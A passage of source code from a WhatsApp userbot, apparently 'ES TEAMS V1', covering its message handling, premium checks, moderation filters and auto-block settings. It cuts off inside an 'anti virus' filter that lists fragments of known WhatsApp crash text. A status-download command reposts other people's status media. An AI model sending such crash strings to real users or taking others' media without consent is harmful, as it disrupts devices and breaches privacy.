//══════════════════════════════════════════════════════════════════════════════════════════════════════//
//                                                                                                      //
//                                    𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏                                                //
//                                                                                                      //
//                                         Ｖ：4.0                                                       //
//                                                                                                      //
//                                                                                                      //      
//               ██╗  ██╗██╗     ██╗ ██████╗ ██████╗ ███╗   ██╗      ██╗   ██╗██╗  ██╗                  //              
//                ██╗██╔╝██║     ██║██╔════╝██╔═══██╗████╗  ██║      ██║   ██║██║  ██║                  //
//                ╚███╔╝ ██║     ██║██║     ██║   ██║██╔██╗ ██║█████╗██║   ██║███████║                  // 
//                ██╔██╗ ██║     ██║██║     ██║   ██║██║╚██╗██║╚════╝╚██╗ ██╔╝╚════██║                  // 
//               ██╔╝ ██╗███████╗██║╚██████╗╚██████╔╝██║ ╚████║       ╚████╔╝      ██║                  //
//                ═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝        ╚═══╝       ╚═╝                  // 
//                                                                                                      //
//                                                                                                      //
//                                                                                                      //
//══════════════════════════════════════════════════════════════════════════════════════════════════════//
//*
//  * @project_name : ES_TEAMS-V1
//  * @author : ES TEAMS TECH
//  * @youtube : https://www.youtube.com/@esteams
//  * @description : ES_TEAMS-V1 ,A Multi-functional whatsapp user bot.
//*
//*
//base by Es teams 
//re-upload? recode? copy code? give credit ya :)
//Instagram: null
//Telegram: t.me/examsolutionteam
//GitHub: @paskito002
//WhatsApp: +2348187637779
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@esteams
//   * Created By Github: ES TEAMS
//   * Credit To ES TEAMS TECH
//   * © 2024 ES_TEAMS-V1
// ⛥┌┤
// */

//CODE TO HANDLE ERRORS
process.on('unhandledRejection', console.error);
process.on('uncaughtException', console.error);
process.setMaxListeners(500);
//---------------------------------------------------------------------------------------------------------------------------//

//MODULE EXPOERTS AND REQUIREMENTS 
require('./settings');
require('./lib/fetch');
const fs = require('fs');
const os = require('os');
const util = require('util');
const jimp = require('jimp');
const path = require('path');
const https = require('https');
const fse = require('fs-extra');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('@distube/ytdl-core');
const cron = require('node-cron');
const cheerio = require('cheerio');
const request = require('request');
const maker = require('mumaker');
const FileType = require('file-type');
const fetch = require('node-fetch');
const { JSDOM } = require('jsdom');
const agent = require('superagent');
const webp = require('node-webpmux');
const ffmpeg = require('fluent-ffmpeg');
const speed = require('performance-now');
const { performance } = require('perf_hooks');
const moment = require('moment-timezone');
const { exec, spawn, execSync } = require('child_process');
const googleTTS = require('google-tts-api');
const PDFDocument = require("pdfkit");
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const fsx = require('fs-extra');
const fg = require('api-dylux');
const { download } = require('aptoide-scraper');
const scp2 = require('./lib/scraper2');
const jsobfus = require('javascript-obfuscator');
const {translate} = require('@vitalets/google-translate-api');
const { randomBytes } = require('crypto')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadContentFromMessage} = require('@whiskeysockets/baileys');
//---------------------------------------------------------------------------------------------------------------------------//

//Alert Function
let ntnsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/badword.json'))
//---------------------------------------------------------------------------------------------------------------------------//

//media
const VoiceNoteXlicon = JSON.parse(fs.readFileSync('./ES_TEAMS-MEDIA/database/xliconvn.json'));
const StickerXlicon = JSON.parse(fs.readFileSync('./ES_TEAMS-MEDIA/database/xliconsticker.json'));
const ImageXlicon = JSON.parse(fs.readFileSync('./ES_TEAMS-MEDIA/database/xliconimage.json'));
const VideoXlicon = JSON.parse(fs.readFileSync('./ES_TEAMS-MEDIA/database/xliconvideo.json'));
const DocXlicon = JSON.parse(fs.readFileSync('./ES_TEAMS-MEDIA/database/doc.json'));
const ZipXlicon = JSON.parse(fs.readFileSync('./ES_TEAMS-MEDIA/database/zip.json'));
const ApkXlicon = JSON.parse(fs.readFileSync('./ES_TEAMS-MEDIA/database/apk.json'));
//---------------------------------------------------------------------------------------------------------------------------//


//Permission Check Function
const prem = require('./src/premium');
const owner = JSON.parse(fs.readFileSync('./src/owner.json'));
//---------------------------------------------------------------------------------------------------------------------------//

// Check for Database Approved Number
async function checkApprovedNumber(sender, reply) {
    const rawSnipUrl = 'https://raw.githubusercontent.com/Pstar0/ES-TEAMS-V1/refs/heads/main/ES_TEAMS-PREMIUM.json';

    try {
        const response = await fetch(rawSnipUrl);  // Using the globally imported fetch
        if (!response.ok) {
            reply('Error fetching owner data. Please try again later.');
            return false; // Stop further execution
        }

        const approvedNumbers = await response.json();
        const senderNumber = sender.split('@')[0];

        if (!approvedNumbers.includes(senderNumber)) {
            return false; // Stop further execution
        }

        return true; // Proceed if approved
    } catch (error) {
        console.error('Error checking approved number:', error);
        reply('An error occurred while verifying your status.');
        return false; // Stop further execution
    }
}
//---------------------------------------------------------------------------------------------------------------------------//

//Uploader & Converter Function
const { TelegraPh, UploadFileUgu } = require('./lib/uploader');
const uploadImage = require('./lib/uploadImage');
const {
    toAudio,
    toPTT,
    toVideo,
    addExifAvatar,
    makeid,
  Telesticker,
  formatBytes,
  formatDuration
} = require('./lib/converter');
const { 
addResponList, 
delResponList, 
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./lib/list');
//---------------------------------------------------------------------------------------------------------------------------//


//Modules Function
const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./lib/scraper3.js');
const { imageToWebp, videoToWebp, writeExif, writeExifImg, writeExifVid } = require('./lib/exif');
const { chatGpt, tiktokDl, ytMp4, ytMp3 } = require('./lib/screaper');
const { gameSlot, gameCasinoSolo, gameMerampok, gameTangkapOr, daily, transferLimit, transferUang, buy, setLimit, setUang } = require('./lib/game');
const { pinterest, wallpaper, wikimedia, quotesAnime, happymod, umma, ringtone, jadwalsholat, styletext } = require('./lib/scraper');
const { formatp, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, webApi, parseMention, generateProfilePicture, getRandom, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, generateToken, batasiTeks, randomText, isEmoji, getAllHTML, fetchBuffer, GIFBufferToVideoBuffer } = require('./lib/function');
//---------------------------------------------------------------------------------------------------------------------------//

// Read Database
let vote = db.others.vote = []
const xliconverifieduser = JSON.parse(fs.readFileSync('./src/user.json'));
const premium = JSON.parse(fs.readFileSync('./database/premium.json'));
//---------------------------------------------------------------------------------------------------------------------------//

// Read JSON
//store database
const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
			users: {},
			groups: {},
			database: {},
			 settings: {},
			others: {},
...(global.db || {})
}

module.exports = XliconBotInc = async (XliconBotInc, m, chatUpdate, store) => {
	try {
		const {
            type
        } = m
        const botNumber = await XliconBotInc.decodeJid(XliconBotInc.user.id)
        const XliconTheCreator = isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
		const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
		const budy = (typeof m.text == 'string' ? m.text : '')
		const prefix = /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi)[0] : '.'
		const isCmd = body.startsWith(prefix)
		//prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const xliconybody = body.startsWith(pric)
        const isCommand = xliconybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
		const args = body.trim().split(/ +/).slice(1)
		const getQuoted = (m.quoted || m)
		const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
		const command = XliconTheCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
		const text = q = args.join(' ')
		const mime = (quoted.msg || quoted).mimetype || ''
		const qmsg = (quoted.msg || quoted)
		const sender = m.sender
		const isUser = xliconverifieduser.includes(sender)
		const groupMetadata = m.isGroup ? await XliconBotInc.groupMetadata(m.chat).catch(e => {}) : ''
		const participants = m.isGroup ? await groupMetadata.participants : ''
		if (m.isGroup) {
			m.metadata = await XliconBotInc.groupMetadata(m.chat)
			m.admins = (m.metadata.participants.reduce((a, b) => (b.admin ? a.push({ id: b.id, admin: b.admin }) : [...a]) && a, []))
			m.isAdmin = m.admins.some((b) => b.id === m.sender)
			m.participant = m.key.participant
			m.isBotAdmin = !!m.admins.find((member) => member.id === botNumber)
		}
//---------------------------------------------------------------------------------------------------------------------------//


 // Function to check for emojis, excluding numbers
const containsEmoji = (text) => {
  const emojiRegex = /[\p{Emoji_Presentation}\p{Extended_Pictographic}\uFE0F]/gu; // Exclude regular Unicode numbers
  return emojiRegex.test(text);
};
//---------------------------------------------------------------------------------------------------------------------------//


// Function to clean the message content, removing timestamps and keeping numbers
const cleanMessage = (messageText) => {
  // Remove timestamps like "Wed, 01 Jan 2024 00:00:00 GMT" but keep other numbers
  messageText = messageText.replace(/\b(?:Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s+\w{3}\s+\d{1,2}\s+\d{4}\s+\d{2}:\d{2}:\d{2}\s+GMT[^\s]+\s\(.+\)\b/gi, ''); 
  
  return messageText.trim(); // Trim any extra spaces
};
//---------------------------------------------------------------------------------------------------------------------------//


// Access the text message content based on its type
let messageText = '';
if (m.message && m.message.conversation) {
  // For simple text messages
  messageText = m.message.conversation;
} else if (m.message && m.message.extendedTextMessage && m.message.extendedTextMessage.text) {
  // For extended text messages
  messageText = m.message.extendedTextMessage.text;
}
//---------------------------------------------------------------------------------------------------------------------------//


// Clean the message to extract only the relevant text
messageText = cleanMessage(messageText);

// Check if the cleaned message contains emojis
const isEmoji = containsEmoji(messageText);


//  logic for detecting message types
const isMedia = /image|video|sticker|audio/.test(mime);
const isImage = (type == 'imageMessage');
const isVideo = (type == 'videoMessage');
const isAudio = (type == 'audioMessage');
const isViewOnce = (type === 'viewOnceMessage' || type === 'viewOnceMessageV2' || type === 'viewOnceMessageV2Extension');
const isDocument = (type == 'documentMessage');
const isLocation = (type == 'locationMessage');
const isContact = (type == 'contactMessage');
const isSticker = (type == 'stickerMessage');
const isText = (type == 'textMessage');
//---------------------------------------------------------------------------------------------------------------------------//


// Quoted message types
const isQuotedText = type === 'extendedTextMessage';
const isQuotedImage = type === 'extendedTextMessage';
const isQuotedLocation = type === 'extendedTextMessage';
const isQuotedVideo = type === 'extendedTextMessage';
const isQuotedSticker = type === 'extendedTextMessage';
const isQuotedAudio = type === 'extendedTextMessage';
const isQuotedContact = type === 'extendedTextMessage';
const isQuotedDocument = type === 'extendedTextMessage';
//---------------------------------------------------------------------------------------------------------------------------//


        //bug
        const clientId = XliconBotInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? XliconBotInc.user.id.split(':')[0] + "@s.whatsapp.net" || XliconBotInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
		
		try {
		const isNumber = x => typeof x === 'number' && !isNaN(x)
		const isBoolean = x => typeof x === 'boolean' && Boolean(x)
		let user = global.db.users[m.sender]
		let limitUser = user ? (user.vip ? global.limit.vip : prem.checkPremiumUser(m.sender, premium) ? global.limit.premium : global.limit.free) : prem.checkPremiumUser(m.sender, premium) ? global.limit.premium : global.limit.free
		let uangUser = user ? (user.vip ? global.uang.vip : prem.checkPremiumUser(m.sender, premium) ? global.uang.premium : global.uang.free) : prem.checkPremiumUser(m.sender, premium) ? global.uang.premium : global.uang.free
		if (typeof user !== 'object') global.db.users[m.sender] = {}
		if (user) {
			if (!('vip' in user)) user.afkReason = false
			if (!isNumber(user.afkTime)) user.afkTime = -1
			if (!('afkReason' in user)) user.afkReason = ''
			if (!isNumber(user.limit)) user.limit = limitUser
			if (!('uang' in user)) user.uang = uangUser
			if (!('lastclaim' in user)) user.lastclaim = new Date * 1
			if (!('lastrampok' in user)) user.lastrampok = new Date * 1
		} else {
			global.db.users[m.sender] = {
				vip: false,
				afkTime: -1,
				afkReason: '',
				limit: limitUser,
				uang: uangUser,
				lastclaim: new Date * 1,
				lastrampok: new Date * 1,
			}
		}
//---------------------------------------------------------------------------------------------------------------------------//


    //database values
			let group = global.db.groups[m.chat];
if (typeof group !== 'object') global.db.groups[m.chat] = {};
if (group) {
    if (!('ntnsfw' in group)) group.ntnsfw = false;
    if (!('welcome' in group)) group.welcome = false;
    if (!('setinfo' in group)) group.setinfo = false;
    if (!('badword' in group)) group.badword = false;
    if (!('antiforeignnum' in group)) group.antiforeignnum = false;
    if (!('antibot' in group)) group.antibot = false;
    if (!('antiviewonce' in group)) group.antiviewonce = false;
    if (!('antispam' in group)) group.antispam = false;
    if (!('antimedia' in group)) group.media = false;
    if (!('antivirtex' in group)) group.antivirtex = false;
    if (!('antiimage' in group)) group.antiimage = false;
    if (!('antivideo' in group)) group.video = false;
    if (!('antiaudio' in group)) group.antiaudio = false;
    if (!('antipoll' in group)) group.antipoll = false;
    if (!('antisticker' in group)) group.antisticker = false;
    if (!('anticontact' in group)) group.anticontact = false;
    if (!('antilocation' in group)) group.antilocation = false;
    if (!('antidocument' in group)) group.antidocument = false;
    if (!('antilink' in group)) group.antilink = false;
    if (!('antipromotion' in group)) group.antipromotion = false;
    if (!('antidelete' in group)) group.antidelete = false;
    if (!('antiemoji' in group)) group.antiemoji = false;
} else {
    global.db.groups[m.chat] = {
        ntsfw: false,
        welcome: false,
        setinfo: false,
        badword: false,
        antiforeignnum: false,
        antibot: false,
        antiviewonce: false,
        antispam: false,
        antivirtex: false,
        media: false,
        antiimage: false,
        video: false,
        antiaudio: false,
        antipoll: false,
        antisticker: false,
        anticontact: false,
        antilocation: false,
        antidocument: false,
        antilink: false,
        antipromotion: false,
        antidelete: false,
        antiemoji: false,
    };
}
		    let setting = global.db.settings[botNumber]
            if (typeof setting !== 'object') global.db.settings[botNumber] = {}
            if (setting) {
            	if (!('anticall' in setting)) setting.anticall = false
               if (!('antiswview' in setting)) setting.antiswview = false
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autodownload' in setting)) setting.autodownload = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
            } else global.db.settings[botNumber] = {
               anticall: false,
           	antiswview: false,
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autodownload: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,               
            }
	} catch (e) {
		throw e;
	}
		
		const isVip = global.db.users[m.sender] ? global.db.users[m.sender].vip : false
		const isPremium = XliconTheCreator || prem.checkPremiumUser(m.sender, premium) || false
		const AntiNsfw = m.isGroup ? global.db.groups[m.chat].ntnsfw : false
		
		function pickRandom(list) {
			return list[Math.floor(list.length * Math.random())]
		}
//---------------------------------------------------------------------------------------------------------------------------//


		// Reset Limit
		cron.schedule('00 00 * * *', () => {
			let user = Object.keys(global.db.users)
			for (let jid of user) {
				const limitUser = global.db.users[jid].vip ? global.limit.vip : prem.checkPremiumUser(jid, premium) ? global.limit.premium : global.limit.free
				global.db.users[jid].limit = limitUser
				console.log('Limit Reseted')
			}
		}, {
			scheduled: true,
			timezone: 'Asia/Karachi'
		})
		
		if (!XliconBotInc.public) {
			if (!m.key.fromMe) return
		}
//---------------------------------------------------------------------------------------------------------------------------//


		//Log
		if (m.message) {
			console.log(chalk.black.bgWhite('[ MESSAGE ]:'),chalk.black.bgGreen(new Date), chalk.black.bgHex('#00EAD3')(budy || m.type) + '\n' + chalk.black(chalk.bgCyanBright('[ FROM ] :'),chalk.bgYellow(m.pushName),chalk.bgHex('#FF449F')(m.sender),chalk.bgBlue('(' + (m.isGroup ? m.pushName : 'Private Chat', m.chat) + ')')));
		}
//---------------------------------------------------------------------------------------------------------------------------//

        
        
// 🚫 Group Only 🚫
               if (!m.isGroup && !XliconTheCreator && db.settings[botNumber].onlygrub) { 
                   if (isCommand) { 
                       return replygcxlicon(`👋 *Hello, buddy!* 🌟\n\n📢 *Group Use Only!* 🛑\n\n⚠️ To avoid spam, this bot is only available in group chats.\n\n🛠️ *Need help?* Contact the owner here: wa.me/${ownernumber}`); 
                   } 
               } 

// 🔒 Private Chat Only 🔒
               if (!XliconTheCreator && db.settings[botNumber].onlypc && m.isGroup) { 
                   if (isCommand) { 
                       return replygcxlicon(`👋 *Hey there!* 🌟\n\n💬 *Private Chat Required!* 🚫\n\n⛔ To use this bot, please chat with it in a private chat.\n\nIf you have any issues, don't hesitate to reach out!`); 
                   } 
               } 

		
		// Auto Read
		if (db.settings[botNumber].autoread) {
            XliconBotInc.readMessages([m.key]);
        }
        
        // 🔄 Auto Set Bio 🔄
	if (db.settings[botNumber].autobio) {
            XliconBotInc.updateProfileStatus(`🚀 ${botname} is Live! 🎉\n\n           🕒 𝙐𝙥𝙩𝙞𝙢𝙚: 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 𝘍𝘰𝘳 ${runtime(process.uptime())} ⏳\n\n                               ©ES TEAMS V1 ⛩️`).catch(_ => _);
        }

        //auto type
        if (db.settings[botNumber].autotype){
        if (m.message) {
        	let xliconpos = ['composing']
            XliconBotInc.sendPresenceUpdate(xliconpos, m.chat)
        }
        }
        
        //auto type record
        if (db.settings[botNumber].autorecordtype){
        if (m.message) {
            let xliconmix = ['composing', 'recording']
            xliconmix2 = xliconmix[Math.floor(xliconmix.length * Math.random())]
            XliconBotInc.sendPresenceUpdate(xliconmix2, m.chat)
        }
        }
        
        //autorecord
        if (db.settings[botNumber].autorecord){
        if (m.message) {
        	let xliconpos = ['recording']
            XliconBotInc.sendPresenceUpdate(xliconpos, m.chat)
        }
        }
        
        //unavailable
        if (db.settings[botNumber].online) {
        	if (isCmd) {
        	XliconBotInc.sendPresenceUpdate('unavailable', m.chat)
        }
        }
        
        // 🚫 Auto Block Number 🚫
        if (m.sender.startsWith(`${autoblocknumber}`) && db.settings[botNumber].autoblocknum === true) {
            return XliconBotInc.updateBlockStatus(m.sender, 'block');
        }

        if (!m.sender.startsWith('91') && db.settings[botNumber].onlyindia === true) {
            return XliconBotInc.updateBlockStatus(m.sender, 'block');
        }

        if (!m.sender.startsWith('62') && db.settings[botNumber].onlyindo === true) {
            return XliconBotInc.updateBlockStatus(m.sender, 'block');
        } 
        
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.groups[m.chat].antiforeignnum === true) { 
            if (XliconTheCreator || m.isAdmin || !m.isBotAdmin) return;
            XliconBotInc.sendMessage(m.chat, { text: `🚫 *Sorry buddy!* 😔\n\nYou will be removed because the group admin/owner has enabled *Anti Foreign Number*. Only +${antiforeignnumber} country code is allowed to join the group.` }, {quoted: m});
            await sleep(2000);
            await XliconBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
        }

//---------------------------------------------------------------------------------------------------------------------------//


      //Special type of message  
        async function sendMessageWithChannel(XliconBotInc, m, imagePath, footerText, messageText) {
          try {
            // Prepare the message content with the image and footer
            let msgs = generateWAMessageFromContent(m.chat, {
              viewOnceMessage: {
                message: {
                  "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                      text: messageText
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                      text: footerText
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: false,
                      ...await prepareWAMessageMedia({ image: fs.readFileSync(imagePath) }, { upload: XliconBotInc.waUploadToServer })
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{}],
                    }),
                    contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363313305181359@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                    }       

                  })
                }
              }
            }, { quoted: m });
        
            // Send the message via the client
            await XliconBotInc.relayMessage(m.chat, msgs.message, {});
          } catch (error) {
            console.error('Error sending message with footer:', error);
          }
        }
        
        
        async function sendMessageWithFooter(XliconBotInc, m, imagePath, footerText, messageText) {
          try {
            // Prepare the message content with the image and footer
            let msgs = generateWAMessageFromContent(m.chat, {
              viewOnceMessage: {
                message: {
                  "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                      text: messageText
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                      text: footerText
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: false,
                      ...await prepareWAMessageMedia({ image: fs.readFileSync(imagePath) }, { upload: XliconBotInc.waUploadToServer })
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{}],
                    }),
                    contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                    }       

                  })
                }
              }
            }, { quoted: m });
        
            
            
            // Send the message via the client
            await XliconBotInc.relayMessage(m.chat, msgs.message, {});
          } catch (error) {
            console.error('Error sending message with footer:', error);
          }
        }
        
//---------------------------------------------------------------------------------------------------------------------------//
        
       // 📥 Download Status #ctto
        try {
            const textLower = m.text.toLowerCase();
            if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
                const quotedMessage = m.msg.contextInfo.quotedMessage;
                if (quotedMessage) {
                    if (quotedMessage.imageMessage) {
                        let imageCaption = quotedMessage.imageMessage.caption;
                        let imageUrl = await XliconBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
                        XliconBotInc.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
                        replygcxlicon('*🖼️ Stealing & Downloading status...*'); 
                    }
                    if (quotedMessage.videoMessage) {
                        let videoCaption = quotedMessage.videoMessage.caption;
                        let videoUrl = await XliconBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
                        XliconBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
                        replygcxlicon('*🎥 Stealing & Downloading status...*');
                    }
                }
            }
        } catch (error) {
            console.error("⚠️ Error in 'send message' handling:", error);
        }

//---------------------------------------------------------------------------------------------------------------------------//

        //autosticker
        if (db.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                XliconBotInc.sendImageAsSticker(m.chat, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                XliconBotInc.sendVideoAsSticker(m.chat, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        // 🚫 Anti-Bot Protection 🚫
        if (db.groups[m.chat].antibot) {
            if (m.isBaileys && m.fromMe == false) {
                if (m.isAdmin || !m.m.isBotAdmin) {
                    // Admin or Bot Admin, do nothing
                } else {
                    replygcxlicon(`*🤖 Another Bot Detected!*\n\n🔒 *Husshhh!* Get away from this group!!!`);
                    return await XliconBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                }
            }
        }

   
// 🚫 Anti-View Once 🚫
    if (db.groups[m.chat].antiviewonce && (isViewOnce)) {
        if (XliconTheCreator || m.isAdmin || !m.isBotAdmin) {
            // Admin or Bot Admin, do nothing
        } else {
            replygcxlicon(`\`\`\`「 📸 View Once Detected 」\`\`\`\n\n⚠️ *Sorry,* but I have to delete it because the admin/owner has activated *Anti-View Once* for this group.`);
            return XliconBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }});
        }
    }


// 🚫 Anti-Emoji 🚫
if (db.groups[m.chat].antiemoji && (isEmoji)) {
    if (XliconTheCreator || m.isAdmin || !m.isBotAdmin) {
        // Admins or bot creators are allowed to send emojis
    } else {
        replygcxlicon(`\`\`\`「 🚫 Emoji Detected 」\`\`\`\n\n⚠️ *Sorry,* but I have to delete it because the admin/owner has activated *Anti-Emoji* for this group.`);
        return XliconBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }});
    }
}

    
// 🚫 Anti-Promotion 🚫
if (db.groups[m.chat].antipromotion) {
    if (budy.match(`instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL`)) {
        if (!m.isBotAdmin) return;
        if (XliconTheCreator) return;
        if (m.isAdmin) return;

        // Delete the promotional message
        await XliconBotInc.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        });

        // Notify the user
        XliconBotInc.sendMessage(m.chat, {
            text: `\`\`\`「 🚫 Promotion Detected 」\`\`\`\n\n⚠️ @${m.sender.split("@")[0]} has sent a promotion message and it has been successfully deleted.`,
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m });
    }
}

// 🚫 Respond to Bad Words 🚫
if (db.groups[m.chat].badword) {
    for (let bak of bad) {
        if (budy === bak) {
            // Delete the message with the bad word
            await XliconBotInc.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant
                }
            });

            // Notify the user about the bad word usage
            XliconBotInc.sendMessage(m.chat, {
                text: `\`\`\`「 🚫 Bad Word Detected 」\`\`\`\n\n⚠️ @${m.sender.split("@")[0]} was using harsh words, and their chat has been deleted.`,
                contextInfo: { mentionedJid: [m.sender] }
            }, { quoted: m });
        }
    }
}

// 🦠 ANTI VIRUS 🦠
if (m.isGroup && db.groups[m.chat].antivirtex) {
    if (
        budy.includes('๒๒๒๒') || 
        budy.includes('ดุ') || 
        budy.includes('ผิดุท้เึางืผิดุท้เึางื') || 
        budy.includes('๑๑๑๑๑๑๑๑๑๑') || 
        budy.includes('৭৭৭৭৭৭৭৭') || 
        budy.includes('   ⃢   ⃢   ⃢  ') || 
